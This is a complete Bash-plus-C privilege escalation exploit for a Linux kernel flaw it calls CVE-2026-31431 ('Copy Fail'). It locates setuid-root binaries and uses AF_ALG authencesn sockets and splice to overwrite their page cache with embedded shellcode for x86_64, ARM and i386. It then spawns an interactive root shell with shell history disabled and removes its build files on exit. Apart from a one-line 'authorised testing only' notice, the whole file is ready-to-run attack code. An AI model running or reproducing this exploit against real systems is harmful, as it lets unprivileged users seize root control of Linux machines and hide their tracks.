#!/usr/bin/env bash
# CVE-2026-31431 - Copy Fail - Bash implementation
# Local privilege escalation via AF_ALG / authencesn page cache corruption.
# Requires: gcc, Linux kernel with AF_ALG support (virtually all distros since 2017).
# Original discovery: Theori / Xint Code (April 2026)
# Bash impl: compiles a minimal C helper inline; no files left on disk after exec.

set -euo pipefail

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
die()  { echo "[!] $*" >&2; exit 1; }
info() { echo "[*] $*"; }
ok()   { echo "[+] $*"; }

usage() {
  cat >&2 <<EOF
Usage: $0 [OPTIONS]

Options:
  -t PATH   Target setuid-root binary (default: auto-detect)
  -c        Check system compatibility only
  -s        Scan and list all setuid-root binaries
  -h        Show this help

CVE-2026-31431 (Copy Fail) - AF_ALG/authencesn page cache corruption LPE.
For authorised security testing only.
EOF
  exit 1
}

# ---------------------------------------------------------------------------
# Find a setuid-root binary
# ---------------------------------------------------------------------------
find_target() {
  local candidates=(
    /usr/bin/su /bin/su /usr/bin/passwd /usr/bin/sudo
    /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn
    /usr/bin/umount /usr/bin/mount /usr/bin/pkexec
  )
  for p in "${candidates[@]}"; do
    [[ -f "$p" ]] || continue
    local mode uid
    mode=$(stat -c '%a' "$p" 2>/dev/null) || continue
    uid=$(stat -c '%u'  "$p" 2>/dev/null) || continue
    (( uid == 0 )) && (( (8#$mode & 04000) != 0 )) && { echo "$p"; return 0; }
  done
  return 1
}

# ---------------------------------------------------------------------------
# Scan all setuid-root binaries
# ---------------------------------------------------------------------------
scan_targets() {
  info "Scanning for setuid-root binaries..."
  local count=0
  while IFS= read -r -d '' f; do
    local mode uid
    mode=$(stat -c '%a' "$f" 2>/dev/null) || continue
    uid=$(stat -c '%u'  "$f" 2>/dev/null) || continue
    (( uid == 0 )) && (( (8#$mode & 04000) != 0 )) && { echo "  $f"; (( count++ )); }
  done < <(find /usr /bin /sbin /opt /snap /lib -type f -print0 2>/dev/null)
  info "Found $count setuid-root binaries."
}

# ---------------------------------------------------------------------------
# Compatibility check
# ---------------------------------------------------------------------------
check_compat() {
  local ret=0

  info "Kernel  : $(uname -r)"
  local arch; arch=$(uname -m)
  info "Arch    : $arch"
  info "UID     : $(id -u)"

  (( $(id -u) == 0 )) && { echo "[!] Already root."; return 1; }

  case "$arch" in
    x86_64|aarch64|arm64|i386|i686|armv7l|armv6l|arm)
      ok "[payload] supported" ;;
    *)
      echo "[!] Arch $arch not supported." >&2; ret=1 ;;
  esac

  command -v gcc >/dev/null 2>&1 \
    && ok "[gcc]     found: $(gcc --version | head -1)" \
    || { echo "[!] gcc not found (required to compile inline C helper)" >&2; ret=1; }

  if grep -q "authencesn(hmac(sha256),cbc(aes))" /proc/crypto 2>/dev/null; then
    ok "[algif_aead] available - system potentially vulnerable"
  else
    echo "[!] authencesn(hmac(sha256),cbc(aes)) not in /proc/crypto." >&2; ret=1
  fi

  local target
  if target=$(find_target); then
    ok "[target]  $target (setuid-root)"
  else
    echo "[!] No setuid-root binary found." >&2; ret=1
  fi

  return $ret
}

# ---------------------------------------------------------------------------
# Inline C exploit helper
# Payloads embedded as byte arrays - no python or external tools needed.
# PTY spawn handled in C via posix_openpt + fork + select I/O loop.
# ---------------------------------------------------------------------------
write_c_source() {
  local dest="$1"
  cat > "$dest" << 'CSRC'
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/if_alg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#define SOL_ALG             279
#define ALG_SET_KEY           1
#define ALG_SET_IV            2
#define ALG_SET_OP            3
#define ALG_SET_AEAD_ASSOCLEN 4
#define ALG_SET_AEAD_AUTHSIZE 5

/* Arch-specific shellcode: setuid(0) + execve("/bin/sh") */
#if defined(__x86_64__)
static const uint8_t sc[] = {
  0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
  0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
  0x9e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x9e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xc0,0x31,0xff,0xb0,0x69,0x0f,0x05,
  0x48,0x8d,0x3d,0x0f,0x00,0x00,0x00,0x31,0xf6,0x6a,0x3b,0x58,0x99,0x0f,0x05,0x31,
  0xff,0x6a,0x3c,0x58,0x0f,0x05,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00
};
#elif defined(__aarch64__)
static const uint8_t sc[] = {
  0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x02,0x00,0xb7,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
  0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
  0xac,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xac,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0xd2,0x48,0x12,0x80,0xd2,
  0x01,0x00,0x00,0xd4,0x00,0x01,0x00,0x10,0x01,0x00,0x80,0xd2,0x02,0x00,0x80,0xd2,
  0xa8,0x1b,0x80,0xd2,0x01,0x00,0x00,0xd4,0x00,0x00,0x80,0xd2,0xa8,0x0b,0x80,0xd2,
  0x01,0x00,0x00,0xd4,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00
};
#elif defined(__i386__)
static const uint8_t sc[] = {
  0x7f,0x45,0x4c,0x46,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x02,0x00,0x03,0x00,0x01,0x00,0x00,0x00,0x54,0x80,0x04,0x08,0x34,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x20,0x00,0x01,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x04,0x08,
  0x00,0x80,0x04,0x08,0x7c,0x00,0x00,0x00,0x7c,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
  0x00,0x10,0x00,0x00,0x31,0xc0,0x31,0xdb,0xb0,0xd5,0xcd,0x80,0x31,0xc0,0x50,0x68,
  0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x53,0x89,0xe1,0x89,
  0xc2,0xb0,0x0b,0xcd,0x80,0x31,0xdb,0x6a,0x01,0x58,0xcd,0x80
};
#elif defined(__arm__)
static const uint8_t sc[] = {
  0x7f,0x45,0x4c,0x46,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x02,0x00,0x28,0x00,0x01,0x00,0x00,0x00,0x54,0x00,0x40,0x00,0x34,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x05,0x34,0x00,0x20,0x00,0x01,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
  0x00,0x00,0x40,0x00,0x88,0x00,0x00,0x00,0x88,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
  0x00,0x00,0x01,0x00,0x00,0x00,0xa0,0xe3,0x17,0x70,0xa0,0xe3,0x00,0x00,0x00,0xef,
  0x18,0x00,0x8f,0xe2,0x00,0x10,0xa0,0xe3,0x00,0x20,0xa0,0xe3,0x0b,0x70,0xa0,0xe3,
  0x00,0x00,0x00,0xef,0x00,0x00,0xa0,0xe3,0x01,0x70,0xa0,0xe3,0x00,0x00,0x00,0xef,
  0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00
};
#else
# error "Unsupported architecture"
#endif

static ssize_t do_splice(int fd_in, loff_t *off_in,
                         int fd_out, loff_t *off_out,
                         size_t len, unsigned int flags)
{
  return (ssize_t)syscall(SYS_splice, fd_in, off_in, fd_out, off_out, len, flags);
}

static size_t pack_cmsg(char *buf, int level, int type,
                        const void *data, socklen_t dlen)
{
  struct cmsghdr *h = (struct cmsghdr *)buf;
  h->cmsg_level = level;
  h->cmsg_type  = type;
  h->cmsg_len   = CMSG_LEN(dlen);
  memcpy(CMSG_DATA(h), data, dlen);
  return CMSG_SPACE(dlen);
}

static void write4(int file_fd, int t, const uint8_t *data)
{
  int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
  if (alg_fd < 0) { perror("socket(AF_ALG)"); exit(1); }

  struct sockaddr_alg sa = {
    .salg_family = AF_ALG,
    .salg_type   = "aead",
    .salg_name   = "authencesn(hmac(sha256),cbc(aes))",
  };
  if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
    perror("bind(AF_ALG)"); exit(1);
  }

  uint8_t key[40] = {
    0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10,
    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0
  };
  if (setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0) {
    perror("setsockopt(KEY)"); exit(1);
  }
  int authsize = 4;
  if (setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, authsize) < 0) {
    perror("setsockopt(AUTHSIZE)"); exit(1);
  }

  int op_fd = (int)syscall(SYS_accept4, alg_fd, 0, 0, 0);
  if (op_fd < 0) { perror("accept4(AF_ALG)"); exit(1); }

  char cmsg_buf[CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4)];
  memset(cmsg_buf, 0, sizeof(cmsg_buf));

  char    *p     = cmsg_buf;
  uint32_t op    = 0;
  uint8_t  iv[20]; memset(iv, 0, sizeof(iv)); iv[0] = 0x10;
  uint32_t assoc = 8;

  p += pack_cmsg(p, SOL_ALG, ALG_SET_OP,            &op,    4);
  p += pack_cmsg(p, SOL_ALG, ALG_SET_IV,            iv,    20);
  p += pack_cmsg(p, SOL_ALG, ALG_SET_AEAD_ASSOCLEN, &assoc, 4);

  uint8_t msg_data[8];
  memcpy(msg_data,     "AAAA", 4);
  memcpy(msg_data + 4, data,   4);

  struct iovec iov = { .iov_base = msg_data, .iov_len = sizeof(msg_data) };
  struct msghdr mhdr = {
    .msg_iov        = &iov,
    .msg_iovlen     = 1,
    .msg_control    = cmsg_buf,
    .msg_controllen = (socklen_t)(p - cmsg_buf),
  };
  if (sendmsg(op_fd, &mhdr, MSG_MORE) < 0) {
    perror("sendmsg"); exit(1);
  }

  int pfd[2];
  if (pipe(pfd) < 0) { perror("pipe"); exit(1); }

  loff_t off = 0;
  if (do_splice(file_fd, &off, pfd[1], NULL, t + 4, 0) < 0) {
    perror("splice(file->pipe)"); exit(1);
  }
  if (do_splice(pfd[0], NULL, op_fd, NULL, t + 4, 0) < 0) {
    perror("splice(pipe->socket)"); exit(1);
  }

  uint8_t *rbuf = malloc(8 + t + 1);
  read(op_fd, rbuf, 8 + t + 1);
  free(rbuf);

  close(pfd[0]); close(pfd[1]);
  close(op_fd);
  close(alg_fd);
}

int main(int argc, char *argv[])
{
  if (argc < 2) {
    fprintf(stderr, "usage: %s <target>\n", argv[0]);
    return 1;
  }
  const char *target_path = argv[1];

  /* Pad payload to 4-byte boundary */
  size_t plen = sizeof(sc);
  uint8_t *payload = malloc(plen + 4);
  memcpy(payload, sc, plen);
  while (plen % 4) payload[plen++] = 0;

  int tfd = open(target_path, O_RDONLY);
  if (tfd < 0) { perror("open(target)"); return 1; }

  int bar_width = 20;
  printf("[*] Overwriting page cache of %s...\n", target_path);
  fflush(stdout);
  for (size_t i = 0; i < plen; i += 4) {
    write4(tfd, (int)i, payload + i);
    int done = (int)((i + 4) * bar_width / plen);
    int pct  = (int)((i + 4) * 100      / plen);
    printf("\r  [");
    for (int j = 0; j < done; j++) putchar('#');
    for (int j = done; j < bar_width; j++) putchar('-');
    printf("] %5zu/%zu (%3d%%)", i + 4, plen, pct);
    fflush(stdout);
  }
  printf("\n[+] Done. %zu bytes written to page cache.\n", plen);
  fflush(stdout);

  close(tfd);
  free(payload);

  /* PTY spawn */
  printf("[+] Spawning root shell on fully interactive PTY...\n");
  fflush(stdout);

  struct winsize ws = {24, 80, 0, 0};
  ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws);

  int master = posix_openpt(O_RDWR | O_NOCTTY);
  if (master < 0) { perror("posix_openpt"); return 1; }
  grantpt(master);
  unlockpt(master);

  char slave_name[256];
  strncpy(slave_name, ptsname(master), sizeof(slave_name) - 1);
  slave_name[sizeof(slave_name) - 1] = '\0';
  ioctl(master, TIOCSWINSZ, &ws);

  pid_t pid = fork();
  if (pid < 0) { perror("fork"); return 1; }
  if (pid == 0) {
    close(master);
    setsid();
    int slave = open(slave_name, O_RDWR);
    if (slave < 0) { perror("open(slave)"); _exit(1); }
    ioctl(slave, TIOCSCTTY, 0);
    dup2(slave, 0); dup2(slave, 1); dup2(slave, 2);
    if (slave > 2) close(slave);
    char *args[] = {(char *)target_path, NULL};
    execv(target_path, args);
    perror("execv"); _exit(1);
  }

  /* Inject shell setup commands */
  usleep(300000);
  char setup[512];
  int n = snprintf(setup, sizeof(setup),
    "bash\n"
    " stty rows %d cols %d\n"
    " export TERM=xterm-256color\n"
    " export SHELL=/bin/bash\n"
    " export HISTFILE=\n"
    " stty sane\n"
    " [ -f /etc/skel/.bashrc ] && source /etc/skel/.bashrc 2>/dev/null\n"
    " [ -f ~/.bashrc ] && source ~/.bashrc 2>/dev/null\n",
    ws.ws_row, ws.ws_col);
  write(master, setup, n);

  /* Put terminal in raw mode */
  struct termios old_tc, raw_tc;
  int is_tty = isatty(STDIN_FILENO);
  if (is_tty) {
    tcgetattr(STDIN_FILENO, &old_tc);
    raw_tc = old_tc;
    cfmakeraw(&raw_tc);
    tcsetattr(STDIN_FILENO, TCSANOW, &raw_tc);
  }

  /* I/O forwarding loop */
  for (;;) {
    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(master, &fds);
    if (is_tty) FD_SET(STDIN_FILENO, &fds);
    struct timeval tv = {0, 50000};
    int r = select(master + 1, &fds, NULL, NULL, &tv);
    if (r < 0 && errno != EINTR) break;
    if (FD_ISSET(master, &fds)) {
      char buf[4096];
      ssize_t nr = read(master, buf, sizeof(buf));
      if (nr <= 0) break;
      write(STDOUT_FILENO, buf, nr);
    }
    if (is_tty && FD_ISSET(STDIN_FILENO, &fds)) {
      char buf[4096];
      ssize_t nr = read(STDIN_FILENO, buf, sizeof(buf));
      if (nr <= 0) break;
      write(master, buf, nr);
    }
  }

  if (is_tty) tcsetattr(STDIN_FILENO, TCSADRAIN, &old_tc);
  write(STDOUT_FILENO, "\n", 1);
  waitpid(pid, NULL, 0);
  return 0;
}
CSRC
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
OPT_TARGET=""
OPT_CHECK=0
OPT_SCAN=0

while getopts ":t:csh" opt; do
  case "$opt" in
    t) OPT_TARGET="$OPTARG" ;;
    c) OPT_CHECK=1           ;;
    s) OPT_SCAN=1            ;;
    h) usage                 ;;
    :) die "Option -$OPTARG requires an argument." ;;
    \?) die "Unknown option: -$OPTARG" ;;
  esac
done

(( OPT_SCAN ))  && { scan_targets; exit 0; }
(( OPT_CHECK )) && { check_compat; exit $?; }

# --- Pre-flight ---
[[ "$(uname -s)" == "Linux" ]] || die "Linux only."
(( $(id -u) == 0 )) && die "Already root - nothing to do."
command -v gcc >/dev/null 2>&1 || die "gcc not found (needed to compile inline C helper)."

ARCH=$(uname -m)
case "$ARCH" in
  x86_64|aarch64|arm64|i386|i686|armv7l|armv6l|arm) ;;
  *) die "Unsupported architecture: $ARCH" ;;
esac

if [[ -z "$OPT_TARGET" ]]; then
  OPT_TARGET=$(find_target) || die "No setuid-root binary found. Use -s to scan, or -t to specify one."
fi
[[ -f "$OPT_TARGET" ]] || die "Target not found: $OPT_TARGET"

info "CVE-2026-31431 - Copy Fail PoC (Bash)"
info "Kernel : $(uname -r)"
info "Arch   : $ARCH"
info "Target : $OPT_TARGET"

if ! grep -q "authencesn(hmac(sha256),cbc(aes))" /proc/crypto 2>/dev/null; then
  die "authencesn not available - try: modprobe algif_aead authencesn hmac cbc"
fi
ok "algif_aead available - system potentially vulnerable"

# --- Workspace (cleaned up on exit) ---
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# --- Compile C helper ---
C_SRC="$WORK/exploit.c"
C_BIN="$WORK/exploit"
write_c_source "$C_SRC"
gcc -O2 -o "$C_BIN" "$C_SRC" || die "Compilation failed."
ok "Compiled inline C helper."

# --- Run ---
exec "$C_BIN" "$OPT_TARGET"
